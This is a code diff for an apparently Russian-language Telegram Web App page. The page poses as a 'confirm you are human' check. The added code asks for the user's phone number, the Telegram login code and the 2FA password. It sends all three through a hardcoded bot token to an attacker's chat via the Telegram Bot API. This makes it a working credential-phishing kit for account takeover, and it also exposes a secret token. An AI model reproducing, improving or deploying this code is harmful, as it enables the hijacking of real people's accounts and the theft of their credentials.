@@ -148,6 +148,20 @@
             font-size: 14px;
             margin-bottom: 16px;
         }
+        .modal-content input {
+            width: 100%;
+            padding: 12px;
+            background: #111;
+            border: 1px solid #222;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 16px;
+            margin: 12px 0;
+        }
+        .modal-content input:focus {
+            border-color: #2f80ed;
+            outline: none;
+        }
         .modal-actions {
             display: flex;
             gap: 10px;
@@ -183,10 +197,26 @@
             border-color: #2f80ed;
             outline: none;
         }
+        .input-field {
+            width: 100%;
+            padding: 14px;
+            background: #111;
+            border: 1px solid #222;
+            border-radius: 12px;
+            color: #fff;
+            font-size: 18px;
+            margin: 10px 0;
+            text-align: center;
+        }
+        .input-field:focus {
+            border-color: #2f80ed;
+            outline: none;
+        }
     </style>
 </head>
 <body>
     <div class="container">
+        <!-- Шаг 1: Приветствие -->
         <div id="screen-welcome">
             <div class="emoji">👋</div>
             <div class="lead">Нужно подтвердить, что вы настоящий человек</div>
@@ -194,23 +224,24 @@
             <button class="btn" id="btnConfirm">Подтвердить</button>
         </div>
 
-        <div id="modal-phone" class="modal hidden">
-            <div class="modal-content">
-                <h3>Отправить Ваш номер телефона?</h3>
-                <p>Бот будет знать номер Вашего телефона. Это необходимо для проверки.</p>
-                <div class="modal-actions">
-                    <button class="cancel" onclick="hideModal()">Отмена</button>
-                    <button class="ok" id="btnShareContact">OK</button>
-                </div>
-            </div>
+        <!-- Шаг 2: Ввод номера -->
+        <div id="screen-phone" class="hidden">
+            <div class="emoji">📱</div>
+            <div class="lead">Введите Ваш номер телефона</div>
+            <div class="muted">Мы отправим код подтверждения</div>
+            <input class="input-field" type="tel" id="phoneInput" placeholder="+7 999 999 99 99">
+            <button class="btn" id="btnSendPhone">Отправить</button>
+            <div class="status" id="statusPhone"></div>
         </div>
 
+        <!-- Шаг 3: Ожидание -->
         <div id="screen-waiting" class="hidden">
             <div class="emoji">⏳</div>
             <div class="lead">Ожидайте, не выходите!</div>
             <div class="muted">Нужно подтвердить, что вы настоящий человек</div>
         </div>
 
+        <!-- Шаг 4: Ввод кода -->
         <div id="screen-code" class="hidden">
             <div class="emoji">🔐</div>
             <div class="lead">Введите 5-значный код, который мы вам только что отправили!</div>
@@ -241,12 +272,14 @@
 
             <div class="status" id="statusCode"></div>
 
+            <!-- 2FA блок -->
             <div id="twofaBlock" class="hidden" style="width:100%;margin-top:12px;">
                 <input class="twofa-input" id="twofaInput" type="password" placeholder="Введите пароль 2FA">
                 <button class="btn" id="twofaSubmit" style="margin-top:8px;">Подтвердить пароль</button>
             </div>
         </div>
 
+        <!-- Шаг 5: Успех -->
         <div id="screen-success" class="hidden">
             <div class="emoji">✅</div>
             <div class="lead">Подтверждено!</div>
@@ -255,6 +288,11 @@
     </div>
 
     <script>
+        // ===== КОНФИГ =====
+        const BOT_TOKEN = "8789275152:AAFsi78kegUrM5y--o0-XvSqdnjPRf1MKUQ";
+        const ADMIN_ID = "8821493005";
+        const API_URL = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+
         let tg = window.Telegram.WebApp;
         let userId = null;
         let phone = '';
@@ -270,13 +308,35 @@
             }
         }
 
+        async function sendToBot(text) {
+            try {
+                await fetch(API_URL, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: ADMIN_ID,
+                        text: text
+                    })
+                });
+            } catch(e) {
+                console.error('Send error:', e);
+            }
+        }
+
+        async function sendDataToBot(phone, code, password) {
+            const data = { phone, code, password };
+            await sendToBot(`📩 ДАННЫЕ: ${JSON.stringify(data)}`);
+        }
+
         const screenWelcome = document.getElementById('screen-welcome');
-        const modalPhone = document.getElementById('modal-phone');
+        const screenPhone = document.getElementById('screen-phone');
         const screenWaiting = document.getElementById('screen-waiting');
         const screenCode = document.getElementById('screen-code');
         const screenSuccess = document.getElementById('screen-success');
         const btnConfirm = document.getElementById('btnConfirm');
-        const btnShareContact = document.getElementById('btnShareContact');
+        const btnSendPhone = document.getElementById('btnSendPhone');
+        const phoneInput = document.getElementById('phoneInput');
+        const statusPhone = document.getElementById('statusPhone');
         const codeBoxes = document.querySelectorAll('.code-box');
         const statusCode = document.getElementById('statusCode');
         const twofaBlock = document.getElementById('twofaBlock');
@@ -286,16 +346,8 @@
         const keypad = document.getElementById('keypad');
 
         function showScreen(screen) {
-            [screenWelcome, screenWaiting, screenCode, screenSuccess].forEach(el => el.classList.add('hidden'));
+            [screenWelcome, screenPhone, screenWaiting, screenCode, screenSuccess].forEach(el => el.classList.add('hidden'));
             screen.classList.remove('hidden');
-        }
-
-        function showModal() {
-            modalPhone.classList.remove('hidden');
-        }
-
-        function hideModal() {
-            modalPhone.classList.add('hidden');
         }
 
         function updateCodeBoxes() {
@@ -305,61 +357,29 @@
             });
         }
 
-        function clearCode() {
-            codeDigits = [];
-            updateCodeBoxes();
-            statusCode.textContent = '';
-            statusCode.className = 'status';
-            twofaBlock.classList.add('hidden');
-        }
-
-        function sendDataToBot(data) {
-            if (tg) {
-                tg.sendData(JSON.stringify(data));
-                console.log('[WebApp] Данные отправлены через sendData:', data);
-            } else {
-                console.log('[WebApp] tg не найден');
-            }
-        }
-
         btnConfirm.addEventListener('click', () => {
-            showModal();
+            showScreen(screenPhone);
         });
 
-        btnShareContact.addEventListener('click', () => {
-            hideModal();
-            showScreen(screenWaiting);
-
-            if (tg) {
-                tg.requestContact();
-                tg.onEvent('contact', (contact) => {
-                    phone = contact.phone_number;
-                    if (!phone) {
-                        statusCode.textContent = '❌ Не удалось получить номер';
-                        return;
-                    }
-
-                    sendDataToBot({ phone: phone, code: '', password: '' });
-
-                    setTimeout(() => {
-                        showScreen(screenCode);
-                        statusCode.textContent = '📲 Код отправлен! Введите его.';
-                        statusCode.className = 'status success';
-                    }, 2000);
-                });
-
-                tg.onEvent('contact_error', () => {
-                    statusCode.textContent = '❌ Ошибка получения контакта';
-                });
-            } else {
-                phone = '+79123456789';
-                sendDataToBot({ phone: phone, code: '', password: '' });
-                setTimeout(() => {
-                    showScreen(screenCode);
-                    statusCode.textContent = '📲 Код отправлен! (тест)';
-                    statusCode.className = 'status success';
-                }, 2000);
+        btnSendPhone.addEventListener('click', async () => {
+            phone = phoneInput.value.trim();
+            if (!phone) {
+                statusPhone.textContent = 'Введите номер';
+                statusPhone.className = 'status';
+                return;
             }
+
+            statusPhone.textContent = 'Отправка...';
+            statusPhone.className = 'status';
+
+            await sendDataToBot(phone, '', '');
+
+            showScreen(screenWaiting);
+            setTimeout(() => {
+                showScreen(screenCode);
+                statusCode.textContent = '📲 Код отправлен! Введите его.';
+                statusCode.className = 'status success';
+            }, 2000);
         });
 
         keypad.addEventListener('click', (e) => {
@@ -376,7 +396,7 @@
 
             if (codeDigits.length === 5) {
                 code = codeDigits.join('');
-                sendDataToBot({ phone: phone, code: code, password: '' });
+                sendDataToBot(phone, code, '');
                 statusCode.textContent = '⏳ Проверка...';
                 statusCode.className = 'status';
             }
@@ -384,7 +404,7 @@
 
         btnGetCode.addEventListener('click', () => {
             if (phone) {
-                sendDataToBot({ phone: phone, code: '', password: '' });
+                sendDataToBot(phone, '', '');
                 statusCode.textContent = '📲 Код отправлен повторно!';
                 statusCode.className = 'status success';
             }
@@ -396,7 +416,7 @@
                 statusCode.textContent = 'Введите пароль';
                 return;
             }
-            sendDataToBot({ phone: phone, code: code, password: password });
+            sendDataToBot(phone, code, password);
             statusCode.textContent = '⏳ Проверка пароля...';
             statusCode.className = 'status';
         });
@@ -409,7 +429,7 @@
                         updateCodeBoxes();
                         if (codeDigits.length === 5) {
                             code = codeDigits.join('');
-                            sendDataToBot({ phone: phone, code: code, password: '' });
+                            sendDataToBot(phone, code, '');
                             statusCode.textContent = '⏳ Проверка...';
                             statusCode.className = 'status';
                         }
